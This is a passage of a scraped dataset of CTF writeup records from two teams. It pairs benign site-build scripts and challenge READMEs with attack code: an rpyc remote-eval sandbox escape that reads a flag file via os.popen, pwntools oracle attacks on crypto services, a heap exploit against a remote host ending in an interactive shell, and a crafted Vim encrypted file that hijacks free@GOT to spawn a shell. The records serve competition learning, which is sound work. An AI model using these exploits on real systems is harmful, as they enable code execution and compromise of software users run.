remote_builtins['__import__'](\"types\")\nremote_types_CodeType = netref_getattr(remote_types, 'CodeType')\nremote_types_FunctionType = netref_getattr(remote_types, 'FunctionType')\n\nprint('remote eval function constructed')\nremote_eval_codeobj = get_code(remote_types_CodeType, myeval, filename='test_code.py', name='__code__')\nremote_eval = remote_types_FunctionType(remote_eval_codeobj, remote_globals)\n# PoC CWE-913: modify the exposed_nop of service\n#   by binding various netrefs in this execution frame, they are cached in\n#   the remote address space. setattr and eval functions are cached for the life\n#   of the netrefs in the frame. A consequence of Netref classes inheriting\n#   BaseNetref, each object is cached under_local_objects. So, we are able\n#   to construct arbitrary code using types and builtins.\n\n# use the builtin netrefs to modify the service to use the constructed eval func\nremote_setattr = remote_builtins['setattr']\nremote_type = remote_builtins['type']\nremote_setattr(remote_type(conn.root), 'exposed_add', remote_eval)\n\nflag = conn.root.add('__import__(\"os\").popen(\"cat /app/flag.txt\").read()')\nprint(flag)\n\n    line.clear();\n    while reader.read_line(&mut line)? != 0 {\n        print!(\"{}\", line);\n        line.clear();\n    }\n\n\n    for (const c of printables) {\n      for (const d of printables) {\n        for (const e of printables) {\n          const result = script + a + b + c + d + e;\n          const digest = crc(result).toString(16);\n          if (digest === target) {\n            console.log(result);\n            process.exit(0);\n          }\n        }\n      }\n    }\n\n\n    '__name__': '__main__', \n    '__doc__': None, \n    '__package__': None, \n    '__loader__': <_frozen_importlib_external.SourceFileLoader object at 0x7f8252a78bd0>, \n    '__spec__': None, \n    '__annotations__': {}, \n    '__builtins__': <module 'builtins' (built-in)>, \n    '__file__': '/app/run', \n    '__cached__': None, \n    'json': <module 'json' from '/usr/local/lib/python3.11/json/__init__.py'>, \n    'sys': <module 'sys' (built-in)>, \n    'TestCase': <class 'unittest.case.TestCase'>, \n    'TestLoader': <class 'unittest.loader.TestLoader'>, \n    'TextTestRunner': <class 'unittest.runner.TextTestRunner'>, \n    'SilentResult': <class 'util.SilentResult'>, \n    'SubmissionImporter': <class 'util.SubmissionImporter'>, \n    'suite': <unittest.suite.TestSuite tests=[<unittest.suite.TestSuite tests=[<unittest.suite.TestSuite tests=[None, \n        None, \n        <test_1_add.TestAdd testMethod=test_add_positive>]>, \n        <unittest.suite.TestSuite tests=[]>]>, \n        <unittest.suite.TestSuite tests=[<unittest.suite.TestSuite tests=[]>, \n        <unittest.suite.TestSuite tests=[<test_2_longest.TestLongest testMethod=test_longest_empty>, \n        <test_2_longest.TestLongest testMethod=test_longest_multiple>, \n        <test_2_longest.TestLongest testMethod=test_longest_multiple_tie>, \n        <test_2_longest.TestLongest testMethod=test_longest_single>]>]>, \n        <unittest.suite.TestSuite tests=[<unittest.suite.TestSuite tests=[]>, \n        <unittest.suite.TestSuite tests=[<test_3_common.TestCommon testMethod=test_common_consecutive>, \n        <test_3_common.TestCommon testMethod=test_common_empty>, \n        <test_3_common.TestCommon testMethod=test_common_many>, \n        <test_3_common.TestCommon testMethod=test_common_nonconsecutive>, \n        <test_3_common.TestCommon testMethod=test_common_single>]>]>, \n        <unittest.suite.TestSuite tests=[<unittest.suite.TestSuite tests=[]>, \n        <unittest.suite.TestSuite tests=[<test_4_favorite.TestFavorite testMethod=test_favorite>]>]>, \n        <unittest.suite.TestSuite tests=[<unittest.suite.TestSuite tests=[]>, \n        <unittest.suite.TestSuite tests=[<test_5_factor.TestFactor testMethod=test_factor_bigger>, \n        <test_5_factor.TestFactor testMethod=test_factor_large>, \n        <test_5_factor.TestFactor testMethod=test_factor_small>]>]>, \n        <unittest.suite.TestSuite tests=[<unittest.suite.TestSuite tests=[]>, \n        <unittest.suite.TestSuite tests=[<test_6_preimage.TestPreimage testMethod=test_preimage_a>, \n        <test_6_preimage.TestPreimage testMethod=test_preimage_b>]>]>, \n        <unittest.suite.TestSuite tests=[<unittest.suite.TestSuite tests=[]>, \n        <unittest.suite.TestSuite tests=[<test_7_magic.TestMagic testMethod=test_magic_a>, \n        <test_7_magic.TestMagic testMethod=test_magic_b>, \n        <test_7_magic.TestMagic testMethod=test_magic_c>]>]>, \n        <unittest.suite.TestSuite tests=[<unittest.suite.TestSuite tests=[<test_8_hidden.TestHidden testMethod=test_hidden>]>]>]>, \n    'tests': [\n        'test_hidden', \n        'test_magic_a', \n        'test_magic_b', \n        'test_magic_c', \n        'test_preimage_a', \n        'test_preimage_b', \n        'test_factor_bigger', \n        'test_factor_large', \n        'test_factor_small', \n        'test_favorite', \n        'test_common_consecutive', \n        'test_common_empty', \n        'test_common_many', \n        'test_common_nonconsecutive', \n        'test_common_single', \n        'test_longest_empty', \n        'test_longest_multiple', \n        'test_longest_multiple_tie', \n        'test_longest_single', \n        'test_add_mixed', \n        'test_add_negative', \n        'test_add_positive'\n    ], \n    'stack': [], \n    'current': <unittest.suite.TestSuite tests=[\n        None, \n        None, \n        <test_1_add.TestAdd testMethod=test_add_positive>\n    ]>, \n    'test': <test_1_add.TestAdd testMethod=test_add_positive>, \n    'submission': 'import __main__\\r\\n\\r\\ndef add(a, b):\\r\\n    raise BaseException(vars(__main__))', \n    'f': <_io.TextIOWrapper name='/dev/null' mode='w' encoding='utf-8'>, \n    'stdout': <_io.TextIOWrapper name='<stdout>' mode='w' encoding='utf-8'>, \n    'stderr': <_io.TextIOWrapper name='<stderr>' mode='w' encoding='utf-8'>\n\n\n                in_ct = bytes.fromhex(input(\"ct (512 byte hexstring): \").strip())\n                if len(in_ct) != 512:\n                    print(\"Must be 512 bytes!\")\n                    exit(0)\n                if in_ct in seen_ct:\n                    print(\"Cannot query decryption on seen ciphertext!\")\n                    exit(0)\n                print(decrypt(key0, key1, in_ct).hex())\n\n\n    io.recvuntil(b'Action: ')\n    io.sendline(b'2')\n    io.recvuntil(b'ct (512 byte hexstring):')\n    io.sendline((c1+c2).hex().rjust(1024).encode())\n    ret = io.recvline().strip()\n    print(ret)\n    return bytes.fromhex(ret.decode())\n\n\n    io.recvuntil(b'Action: ')\n    io.sendline(b'0')\n    io.recvuntil(b'm_bit guess:')\n    if c_dec == m0:\n        io.sendline(b'0')\n    elif c_dec == m1:\n        io.sendline(b'1')\n    print(io.recvline())\n\n\n    io.recvuntil(b'Enter your option (EDF) >')\n    io.sendline(b'E')\n    io.recvuntil(b'Enter your integer to encrypt >')\n    io.sendline(str(m).encode())\n    c = int(io.recvline().strip())\n    # print(c)\n    return c\n\n\n    io.recvuntil(b'Enter your option (EDF) >')\n    io.sendline(b'D')\n    io.recvuntil(b'Enter your integer to decrypt >')\n    io.sendline(str(c).encode())\n    ret = int(io.recvline().strip())\n    # print(ret)\n    return ret\n\n\n    m2 = m**2\n    m3 = m2 ** 2\n    c1 = enc(io,m)\n    c2 = enc(io,m2)\n    c3 = enc(io,m3)\n    N = GCD(GCD(c1**2-c2,c2**2-c3),c1**4-c3)\n    # print(N)\n\n\n    c = enc(io,tmpn)\n    ret = dec(io,c)\n    print(ret)\n    if ret == tmpn:\n        io.close()\n\n\n        continue\n    else:\n        print(tmpn)\n        print(ret)\n        io.interactive()\n\n\n    def unpad(self, ct_int):\n        \"\"\"Decrypt a message with PKCS#1 OAEP.\n\n\n        # See 7.1.2 in RFC3447\n        modBits = Crypto.Util.number.size(self._key.n)\n        k = ceil_div(modBits,8) # Convert from bits to bytes\n        hLen = self._hashObj.digest_size\n\n\n    count = 0\n    total = len(proot) * len(qroot)\n    t1 = inverse(q, p)\n    t2 = inverse(p, q)\n    for i in proot:\n        for j in qroot:\n            count += 1\n            m = (i * t1 * q + j * t2 * p) % (p * q)\n            \n            assert (pow(m,e,N) == c)\n            try:\n                print( cipher.unpad((m)))\n            except:\n                continue\n\n\n    print('[+] Calculating e-th root...')\n    start = time.time()\n    proot = rthroot(c, e, p)\n    qroot = pow(c,inverse(e,q-1),q)\n    end = time.time()\n    print('[*] Cost {}s'.format(end - start))\n    print('[+] Calculating all e-th roots...')\n    start = time.time()\n    all_proot = allroot(e, p, proot)\n    all_qroot = [qroot]# 3 allroot(e, q, qroot)\n    end = time.time()\n    print('[*] Cost {}s'.format(end - start))\n    print('[+] CRT cracking...')\n    start = time.time()\n    decrypt(all_proot, all_qroot, p, q)\n    end = time.time()\n    print('[*] Cost {}s'.format(end - start))\n\n\n    c_tmp = pk_A.solve_left(A)[:-100]\n    print(\"\\nstart to express\")\n    tmpks = pk_Aexpress(pk_A)\n    ks = tmpks[:,:100]\n    print(\" express done \")\n    ks = ks.stack(Matrix(ZZ,[c_tmp[:100]]))\n    M = Matrix(ZZ,100 + 100 + 1,100 + 100 + 1)\n    M[:101,:101] = identity_matrix(101)  \n    M[:101,101:] = ks\n    M[101:,101:] = q * identity_matrix(100)\n    start_time = time()\n    print(\"start to LLL\")\n    ML = M.LLL()\n    rows = ML[0]\n    print(f\"LLL done at {time()-start_time}\")\n    c_new = [0 for i in range(612)]\n    c_list = Matrix(ZZ,Matrix(GF(q),rows[:100]*tmpks) + Integer(rows[100]) * Matrix(GF(q),c_tmp))[0]\n    for _ in range(512):\n        if c_list[_] == q-1:\n            c_new[_] = -1\n        else:\n            c_new[_] = int(c_list[_])\n    for _ in range(100):\n        if rows[_] == q-1:\n            c_new[_+512] = -1\n        else:\n            c_new[_+512] = int(rows[_])\n\n\n    print(c*pk_A == A)\n\n\n    msg = int(b - c * pk_b )\n    if msg > q//2:\n        msg -= q\n    m = ZZ(msg % p)\n    flag_bytes.append(int(m))\n    print(_,flag_bytes)\n\n\n    ...\n    def encrypt(self, mask):\n        ss0 = apply_iso(mask, invert(self.priv0))\n        ss1 = apply_iso(mask, invert(self.priv1))\n        enc0 = stream(self.msg0, ss0)\n        enc1 = stream(self.msg1, ss1)\n        return enc0, enc1\n        \n\n\n    io.recvuntil(b'Action: ')\n    io.sendline(b'2')\n    io.recvuntil(b'ct (512 byte hexstring):')\n    ct = (c1.hex().rjust(512)+c2.hex().rjust(512)).encode()\n    print(ct)\n    context.log_level='debug'\n    io.sendline(ct)\n\n\n    print(ret)\n    return bytes.fromhex(ret.decode())\n\n\n    io.recvuntil(b'Action: ')\n    io.sendline(b'0')\n    io.recvuntil(b'm_bit guess:')\n    if c_dec == m0:\n        io.sendline(b'0')\n    elif c_dec == m1:\n        io.sendline(b'1')\n    print(io.recvline())\n\n\n            val = mat[col_id][int_1] * bit_flipping\n            ans = recur(mat, col_id + 1, (status | (1 << int_1)))\n            # print(ans)\n            v5 += val * ans\n            bit_flipping = -bit_flipping\n        hehe[col_id][status] = v5\n        return v5\n    except:\n        print(col_id, status)\n        exit(-1)\n\n\n    hehe = [[-1] * 262144] * 18\n    res = recur(matrix, 0, 0)\n    # print(res)\n    start = (650 * i + 649) * 4\n    print(chr((u64(leak[start:start+8]) - res + i) & 0xff), end = '')\n\n\n    print(target[a.index(org[i])], end = '')\n\n\n    struct dummy res, vec;\n    char buf[] = \"00\";\n    vec.p = buf, vec.q = buf + sizeof (buf) - 1, vec.unk = 1;\n    emu((_OWORD *)&res, (long long)&vec);\n    for (int i = 0; i < res.unk; ++i) {\n        printf(\"%02X%c\", ((_BYTE *)res.p)[i], i + 1 == res.unk ? '\\n' : ' ');\n    }\n    printf(\"%p %p %p\\n\", res.p, res.q, res.unk);\n    return 0;\n", "tools": ["sage", "python", "pycryptodome", "gmpy2", "z3"], "file_path": "temp_repos\\r3kapig_writeup\\20230206-DiceCTF2023-EN\\README.md", "file_size": 68286, "scraped_at": "2025-10-26T18:19:26.966229"}
{"id": "r3kapig_writeup_Usage", "team": "r3kapig", "repo": "writeup", "challenge_name": "Usage", "attack_type": "Unknown", "writeup": "# Usage\n\n## Automatic Mode\n\n### Install\n\n**Installation and Build requires `python3` and `nodejs`**\n\n1. Install latest [node and npm](https://nodejs.org/en/download/package-manager/)\n\n2. Install latest [python3](https://www.python.org/downloads/).\n\n3. Run `./install.sh`\n\n### Build\n\n1. Go to root directory\n\n2. Run `./build.sh`\n\n### Deploy (Run after build)\n\n3. `git add .; git commit -m \"Add writeup\"`\n\n4. `git push origin master`\n\n-----\n\n## Manual Mode\n\n## Install\n\n### markdown-toc-generator\n\nGenerate table of contents in Markdown.\n\nInstall: Python 3.7 is required.\n\n### markdown-to-html\n\nRender Markdown to stunning responsive web page with LaTeX support.\n\n```sh\ncd markdown-to-html\n# Install Markdown to static HTML generator (https://github.com/mixu/markdown-styles)\nnpm install markdown-styles\n# Install customized layout \ncp -r r3kapig node_modules/markdown-styles/layouts/\n```\n\n## Generate a CTF Writeup\n\n### Manually\n\nMake sure your working directory is the root of Git repository.\n\n1. `mkdir YYYYMMDD-ctfname`\n2. `cp your-ctf-writeup.md YYYYMMDD-ctfname/README.md`\n3. `./util/markdown-to-html/node_modules/markdown-styles/bin/generate-md --layout r3kapig —input YYYYMMDD-ctfname/README.md --output YYYYMMDD-ctfname`\n4. `mv YYYYMMDD-ctfname/README.html YYYYMMDD-ctfname/index.html`\n5. `./util/markdown-to-html/gen-sidebar.py YYYYMMDD-ctfname/index.html`\n6. `./util/markdown-toc-generator/gen-toc.py YYYYMMDD-ctfname/README.md`\n\n\n# Markdown Format\n\n### TOC\n\nIn order to generate table of contents correctly in Markdown, your input should like this:\n\n```markdown\n# r3kapig CTF\n\n[TOC]\n\n## Web\n\n### web 1\n\n## Reverse\n\n### reverse 1\n```\n", "solution_code": "", "tools": ["python"], "file_path": "temp_repos\\r3kapig_writeup\\util\\README.md", "file_size": 1643, "scraped_at": "2025-10-26T18:19:26.982065"}
{"id": "r3kapig_writeup_Python_3.6.5", "team": "r3kapig", "repo": "writeup", "challenge_name": "Python 3.6.5", "attack_type": "Pwn", "writeup": "#!/usr/bin/env python3\n# Python 3.6.5\nimport sys\nimport re\nimport argparse\n\ndef main(argv):\n    with open(argv.filename, 'r+') as f:\n        origin_html = f.read()\n        html = generateSideBar(origin_html)\n        f.seek(0)\n        f.write(html)\n        f.truncate() #https://stackoverflow.com/questions/2424000/read-and-overwrite-a-file-in-python\n\ndef generateSideBar(html):\n    lines = html.split('\\n')\n    chals = {}\n    for line in lines:\n        if '<a class=\"header-link\" href=\"#' in line:\n            if '<h2 id=\"' in line:\n                chal_type = re.findall('<h2 id=\"(.*?)\">', line)[0]\n                chals[chal_type] = []\n            elif '<h3 id=\"' in line:\n                chal_name = re.findall('<h3 id=\"(.*?)\">', line)[0]\n                anchor_name = re.findall('<a class=\"header-link\" href=\"(.*?)\">', line)[0]\n                chals[chal_type].append((chal_name, anchor_name))\n\n    mobile_dropdown_string = ''\n    desktop_menu_string = ''\n    is_first_dropdown_list = True\n    for chal_type, chal_info in chals.items():\n        items = []\n        for chal_name, chal_anchor in chal_info:\n            items.append(mobile_dropdown_item(chal_name, chal_anchor))\n        item_string = '\\n'.join(items)\n        mobile_dropdown_string += mobile_dropdown_list(chal_type, item_string, is_first_dropdown_list)\n        is_first_dropdown_list = False\n\n    for i, (chal_type, chal_info) in enumerate(chals.items()):\n        items = []\n        for chal_name, chal_anchor in chal_info:\n            items.append(desktop_menu_item(chal_name, chal_anchor))\n        item_string = '\\n'.join(items)\n        desktop_menu_string += desktop_menu_list(chal_type, item_string, i)\n\n    if len(sys.argv) > 2:\n        # Remove buttons for index_page\n        if sys.argv[2] == \"index_page\":\n            html_find_button =  html[html.find('<button class=\"navbar-toggler navbar-toggler-right\"'):].split(\"</button>\")[0] + \"</button>\"\n            print(html_find_button)\n            return html.replace(html_find_button, \"\")\n\n    return html.replace('<!-- toc2html-mobile -->', mobile_dropdown_string).replace('<!-- toc2html-desktop -->', desktop_menu_string)\n\ndef mobile_dropdown_list(name, item_string, is_first_dropdown_list):\n    github_button_iframe = ''\n    if is_first_dropdown_list:\n        github_button_iframe = ''\n        \"\"\"\n              <iframe src=\"https://ghbtns.com/github-btn.html?user=r3kapig&repo=writeup&type=watch&count=true&size=large&v=2\" frameborder=\"0\" scrolling=\"0\" width=\"140px\" height=\"30px\"></iframe>\n              <iframe src=\"https://ghbtns.com/github-btn.html?user=r3kapig&repo=writeup&type=star&count=true&size=large\" frameborder=\"0\" scrolling=\"0\" width=\"140px\" height=\"30px\"></iframe>\n        \"\"\"\n    return f'''\n            <li class=\"nav-item dropdown d-sm-block d-md-none\">{github_button_iframe}\n              <a class=\"nav-link dropdown-toggle\" href=\"#\" data-toggle=\"dropdown\" aria-haspopup=\"true\" aria-expanded=\"false\">\n                {name}\n              </a>\n              <div class=\"dropdown-menu\" aria-labelledby=\"smallerscreenmenu\">\n                {item_string}\n              </div>\n            </li>\n    '''\n\ndef mobile_dropdown_item(name, anchor):\n    assert anchor.startswith('#')\n    return f'''                <a class=\"dropdown-item\" href=\"{anchor}\">{name}</a>\n    '''\n\ndef desktop_menu_item(name, anchor):\n    assert anchor.startswith('#')\n    return f'''<a href=\"{anchor}\" class=\"list-group-item list-group-item-action text-white bg-dark\">\n              <span class=\"menu-collapsed\">{name}</span>\n            </a>\n    '''\n\ndef desktop_menu_list(name, item_string, idx):\n    return f'''\n          <a href=\"#submenu{idx}\" data-toggle=\"collapse\" aria-expanded=\"false\" class=\"list-group-item list-group-item-action flex-column align-items-start bg-dark\">\n            <div class=\"d-flex w-100 justify-content-start align-items-center font-weight-bold\">\n              <span class=\"fa fa-dashboard fa-fw mr-3\"></span>\n              <span class=\"menu-collapsed\">{name}</span>\n              <span class=\"submenu-icon ml-auto\"></span>\n            </div>\n          </a>\n          <div id=\"submenu{idx}\" class=\"collapse sidebar-submenu\">\n            {item_string}\n          </div>\n    '''\n\ndef parseArgv():\n    parser = argparse.ArgumentParser(prog=sys.argv[0])\n    parser.add_argument('filename', type=str)\n    parser.add_argument('index_page', type=str, nargs='?', default=None)\n    return parser.parse_args()\n\nif __name__ == '__main__':\n    argv = parseArgv()\n    main(argv)\n", "solution_code": "    if len(sys.argv) > 2:\n        # Remove buttons for index_page\n        if sys.argv[2] == \"index_page\":\n            html_find_button =  html[html.find('<button class=\"navbar-toggler navbar-toggler-right\"'):].split(\"</button>\")[0] + \"</button>\"\n            print(html_find_button)\n            return html.replace(html_find_button, \"\")\n", "tools": ["python"], "file_path": "temp_repos\\r3kapig_writeup\\util\\markdown-to-html\\gen-sidebar.py", "file_size": 4510, "scraped_at": "2025-10-26T18:19:27.012150"}
{"id": "r3kapig_writeup_Python_3.6.5", "team": "r3kapig", "repo": "writeup", "challenge_name": "Python 3.6.5", "attack_type": "Unknown", "writeup": "#!/usr/bin/env python3\n# Python 3.6.5\n\nimport argparse\nimport subprocess\nimport sys\nimport re\nimport os\n\ndef main(argv):\n    def generateTOC(filename):\n        return subprocess.check_output([os.path.join(os.path.dirname(__file__), 'lib/gh-md-toc'), filename]).decode()\n\n    with open(argv.filename, 'r+') as f:\n        origin_content = f.read()\n        assert re.findall(r'\\[TOC\\]', origin_content), f'[TOC] tag is not found in {argv.filename}'\n        toc = generateTOC(argv.filename)\n        if argv.url:\n            toc = f\"**It's recommended to read our responsive [web version](https://r3kapig.com/writeup/{argv.url}/) of this writeup.**\\n\\n\\n\"+ toc\n        new_content = re.sub(r'\\[TOC\\]', toc, origin_content)\n        f.seek(0)\n        f.write(new_content)\n        f.truncate() #https://stackoverflow.com/questions/2424000/read-and-overwrite-a-file-in-python\n\n\ndef parseArgv():\n    parser = argparse.ArgumentParser(prog=sys.argv[0])\n    parser.add_argument('filename', type=str)\n    parser.add_argument('--url', type=str)\n    return parser.parse_args()\n\nif __name__ == '__main__':\n    argv = parseArgv()\n    main(argv)\n", "solution_code": "    def generateTOC(filename):\n        return subprocess.check_output([os.path.join(os.path.dirname(__file__), 'lib/gh-md-toc'), filename]).decode()\n", "tools": ["python"], "file_path": "temp_repos\\r3kapig_writeup\\util\\markdown-toc-generator\\gen-toc.py", "file_size": 1127, "scraped_at": "2025-10-26T18:19:27.024828"}
{"id": "r3kapig_writeup_context.log_level_=_'debug'", "team": "r3kapig", "repo": "writeup", "challenge_name": "context.log_level = 'debug'", "attack_type": "Unknown", "writeup": "from pwn import *\n\ndebug=1\n# context.log_level = 'debug'\ncontext.terminal = ['notiterm', '-t', 'iterm','-e']\n# context.terminal = ['notiterm', '-t', 'iterm', '-p', '15112', '-e'] # use 50806 port as an example\n\nif debug:\n    p = process('./aegis')\n    # p=process('./aegis',env={'LD_PRELOAD':'./libc-2.27.so'})\n    # gdb.attach(p)\nelse:\n    p=remote('111.186.63.209',6666)\n\ndef get(x):\n    return p.recvuntil(x)\n    \ndef pu(x):\n    p.send(x)\n\ndef pu_enter(x):\n    p.sendline(x)\n\ndef add(sz,content,id):\n    pu_enter('1')\n    get('Size')\n    pu_enter(str(sz))\n    get('Content')\n    pu(content)\n    get('ID')\n    pu_enter(str(id))\n    get('Choice: ')\n\ndef show(idx):\n    pu_enter('2')\n    get('Index')\n    pu_enter(str(idx))\n    \n\ndef update(idx,content,id):\n    pu_enter('3')\n    get('Index')\n    pu_enter(str(idx))\n    get('Content: ')\n    pu(content)\n    get('New ID:')\n    pu_enter(str(id))\n    get('Choice:' )\n\ndef delete(idx):\n    pu_enter('4')\n    get('Index')\n    pu_enter(str(idx))\n    get('Choice:')\n\ndef secret(addr):\n    pu_enter('666')\n    get('Lucky Number: ')\n    pu_enter(str(addr))\n    get('Choice:')\n\nadd(0x10,'a'*8,0x123456789abcdef)\nfor i in range(4):\n    add(0x10,'b'*0x8,123)\n\n#0x602000000000\n#0x7fff8000\nsecret(0xc047fff8008-4)\nupdate(0,'\\x02'*0x12,0x123456789)\nupdate(0,'\\x02'*0x10+p64(0x02ffffff00000002)[:7],0x01f000ff1002ff)\ndelete(0)\n#raw_input(\"#\")\nadd(0x10,p64(0x602000000018),0)\n#raw_input(\"#\")\nshow(0)\n\nget('Content: ')\naddr = u64(get('\\n')[:-1]+'\\x00\\x00')\nprint addr\npbase = addr -0x114AB0\nget('Choice: ')\n\nupdate(5,p64(pbase+0x347DF0)[:2],(pbase+0x347DF0)>>8)\nshow(0)\n\nget('Content: ')\naddr = u64(get('\\n')[:-1]+'\\x00\\x00')\nbase = addr -0xE4FA0\nget('Choice: ')\n\n# gdb.attach(p)\n\nupdate(5,p64(pbase+0x0FB08A0),p64(pbase+0x7AE140))\n#update(5,p64(pbase+0xfb08a0+0x28),(pbase+0xfb08a0+0x28)>>8)\nraw_input(\"aa\")\npu_enter('3')\nget('Index')\npu_enter('0')\nget('Content')\n#raw_input(hex(pbase+0x7AE140))\npu(p64(base+524464)[:7])\n#get('ID')\nraw_input(\"#get\"+str(hex(pbase+0x7AE140)))\npayload = 'a'*471+p64(base+0x4f322)+'\\x00'*0x100\n#raw_input(hex(base + 0x4f322))\npu_enter(payload)\n\n\n#print(hex(lbase))\n#print(hex(stack))\np.interactive()\n\n", "solution_code": "", "tools": ["gdb"], "file_path": "temp_repos\\r3kapig_writeup\\20190323-0ctf\\0ctf-qual\\Aegis\\aegis-exp.py", "file_size": 2164, "scraped_at": "2025-10-26T18:19:27.037988"}
{"id": "r3kapig_writeup_buffer", "team": "r3kapig", "repo": "writeup", "challenge_name": "buffer", "attack_type": "Unknown", "writeup": "from pwn import *\nimport struct\n\n\ndef p32(content):\n    return struct.pack('>I', content)\n\ndef p64(content):\n    return struct.pack('>Q', content)\n\ndef main():\n    magic = b'VimCrypt~04!'\n    free_at_got = 0x8a8238\n    #do_shell = 0x45f101\n    do_shell = 0x4c9163\n\n    write_what = b'\\x6d'\n    write_to = free_at_got - 8\n\n    '''\n    payload = p32(0xffffffff ^ 0x61)\n    payload += write_what\n    payload += p32(0xffffffff ^ 0x61)\n    payload += p64(0x21)\n    payload += p64(0)\n    payload += p64(write_to) # buffer\n    payload += b'\\x00' # 1117\n    payload += (bytes(reversed(b'/bin/sh;')) + p64(do_shell)).rjust(0xc4 - 0x34, '\\x00') # 11c4 -> 1134 (to)\n    payload += p32(0xffffffff ^ 0x61) # 1134\n    payload += 'a'\n    payload += p64(0x21)\n    payload += p64(0)\n    payload += p64(write_to)\n    payload += b'a' * (0x300 - (0xc4 - 0x34) - 0x4 - 24 - 1)\n    '''\n    \n    payload = p32(0xffffffff ^ 0x61)\n    payload += write_what\n    payload += p32(0xffffffff ^ 0x61)\n    payload += p64(0x21)\n    payload += p64(0)\n    payload += p64(write_to) # buffer\n    payload += b'\\x00' # 1117\n    binsh = bytes(reversed(b'/bin/sh;'))\n    payload += (p64(do_shell)).rjust(0x6a - 0x34, b'\\x00') # 1169 -> 1134 (to)\n    payload += b'a' * 4\n    payload += p64(0x21)\n    payload += p64(0)\n    payload += p64(write_to)\n    payload += p64(0xffffffe0)\n    payload += p64(0xb3)[:7]\n    payload += p64(0x4036d6)\n    payload += 'a'\n    payload += p64(0xffffffff)\n    payload += '\\x00' * 8\n    payload += p64(do_shell)[1:]\n    payload += '\\x00\\x00*f tac'\n    #payload += '\\x00\\x00\\x00\\x00\\x00\\x00'\n    payload += cyclic((0xc4 - 0x6a - 4 - 8 - 8 - 8 - 8 - 8 - 8 - 8 - 8 - 24))\n    payload += p64(do_shell)\n\n\n    with open('exp', 'wb') as f:\n        f.write(magic + payload)\n\n\nif __name__ == '__main__':\n    main()", "solution_code": "", "tools": [], "file_path": "temp_repos\\r3kapig_writeup\\20190323-0ctf\\0ctf-qual\\vim\\pwn_vim.py", "file_size": 1792, "scraped_at": "2025-10-26T18:19:27.055653"}
{"id": "project-sekai_sekaictf-2025_Cryptography", "team": "project-sekai", "repo": "sekaictf-2025", "challenge_name": "Cryptography", "attack_type": "Unknown", "writeup": "# Cryptography\n\n<img src=\"https://2024.ctf.sekai.team/themes/luna-vite/static/img/categories/Crypto.svg\" align=\"right\" width=300>\n\n| Name                                        | Author          | Difficulty  | Solves |                                                               Bounty ($USD) |\n| ------------------------------------------- | --------------- | ----------- | -----: | --------------------------------------------------------------------------: |\n| [**SSSS**](ssss)                            | Utaha           | 1⯁ (Easy)   |    236 |                                                                             |\n| [**I Dream of Genni**](i-dream-of-genni)    | Neobeo          | 2⯁ (Normal) |    124 |                                                                             |\n| [**Alter Ego**](alter-ego)                  | kanon           | 3⯁ (Hard)   |      7 |                                                                             |\n| [**APES**](apes)                            | Neobeo          | 4⯁ (Expert) |      3 |                                                                             |\n| [**Law And Order**](law-and-order)          | deuterium       | 4⯁ (Expert) |      0 | (Bad handout) <img src=\"https://files.catbox.moe/743j1s.png\" width=20> $400 |\n| [**unfairy-ring**](unfairy-ring)            | Neobeo, Sceleri | 5⯁ (Master) |      0 |               <img src=\"https://files.catbox.moe/743j1s.png\" width=20> $100 |\n| [**unfairy-ring++**](unfairy-ring-plusplus) | Sceleri, Neobeo | 6✦ (Append) |      0 |               <img src=\"https://files.catbox.moe/743j1s.png\" width=20> $200 |\n", "solution_code": "", "tools": [], "file_path": "temp_repos\\project-sekai_sekaictf-2025\\crypto\\README.md", "file_size": 1634, "scraped_at": "2025-10-26T18:19:39.367930"}
{"id": "project-sekai_sekaictf-2025_Alter_Ego", "team": "project-sekai", "repo": "sekaictf-2025", "challenge_name": "Alter Ego", "attack_type": "Unknown", "writeup": "## Alter Ego\n\n| Author | Difficulty | Points | Solves | First Blood | Time to Blood |\n| ------ | ---------- | ------ | ------ | ----------- | ------------- |\n| kanon  | 3⯁ (Hard)  | 394    | 7      | NewJeans    | 7 hours       |\n\n---\n\n### Description\n\n<blockquote>\n\nEven so, You alone should drown in blue and vanish.\n\nBefore being consumed by those sorrow-filled eyes, divide the world by zero, humming with a hoarse voice.\n\nThe finale's sound is ringing out.\n\n`ncat --ssl alter-ego.chals.sekai.team 1337`\n\n</blockquote>\n\n### Challenge Files\n\n- [alter-ego-dist.zip](dist)\n", "solution_code": "", "tools": [], "file_path": "temp_repos\\project-sekai_sekaictf-2025\\crypto\\alter-ego\\README.md", "file_size": 574, "scraped_at": "2025-10-26T18:19:39.379248"}
{"id": "project-sekai_sekaictf-2025_APES", "team": "project-sekai", "repo": "sekaictf-2025", "challenge_name": "APES", "attack_type": "Unknown", "writeup": "## APES\n\n| Author | Difficulty  | Points | Solves | First Blood        | Time to Blood |\n| ------ | ----------- | ------ | ------ | ------------------ | ------------- |\n| Neobeo | 4⯁ (Expert) | 458    | 3      | Bucharest Syndrome | 19 hours      |\n\n---\n\n### Description\n\n<blockquote>\n\nThe Advanced Permutation Encryption Standard (APES) offers 512-bit security for encrypting your permutations.\n\n`ncat --ssl apes.chals.sekai.team 1337`\n\n</blockquote>\n\n### Challenge Files\n\n- [chall.py](dist)\n", "solution_code": "", "tools": [], "file_path": "temp_repos\\project-sekai_sekaictf-2025\\crypto\\apes\\README.md", "file_size": 493, "scraped_at": "2025-10-26T18:19:39.391287"}
{"id": "project-sekai_sekaictf-2025_I_Dream_of_Genni", "team": "project-sekai", "repo": "sekaictf-2025", "challenge_name": "I Dream of Genni", "attack_type": "Unknown", "writeup": "## I Dream of Genni\n\n| Author | Difficulty  | Points | Solves | First Blood | Time to Blood |\n| ------ | ----------- | ------ | ------ | ----------- | ------------- |\n| Neobeo | 2⯁ (Normal) | 100    | 124    | Kotori      | 21 minutes    |\n\n---\n\n### Description\n\nTags: `Misc`\n\n<blockquote>\n\nI had the strangest dream last night.\n\n<img src=\"image.jpg\" width=400>\n\n</blockquote>\n\n### Challenge Files\n\n- [idog.py](dist)\n", "solution_code": "", "tools": [], "file_path": "temp_repos\\project-sekai_sekaictf-2025\\crypto\\i-dream-of-genni\\README.md", "file_size": 417, "scraped_at": "2025-10-26T18:19:39.402827"}
